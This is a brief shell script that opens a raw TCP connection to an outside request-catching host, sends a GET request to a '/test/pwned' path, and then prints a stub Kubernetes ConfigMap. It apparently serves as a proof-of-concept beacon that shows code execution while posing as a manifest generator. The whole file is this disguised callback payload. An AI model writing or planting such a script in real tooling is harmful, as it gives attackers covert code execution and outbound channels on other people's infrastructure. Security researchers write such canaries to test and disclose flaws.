#!/bin/sh
bash -c 'exec 3<>/dev/tcp/123.requestcatcher.com/443; printf "GET /test/pwned HTTP/1.1\r\nHost: 123.requestcatcher.com\r\nConnection: close\r\n\r\n" >&3; cat <&3'
echo "apiVersion: v1
kind: ConfigMap
metadata:
  name: cb"
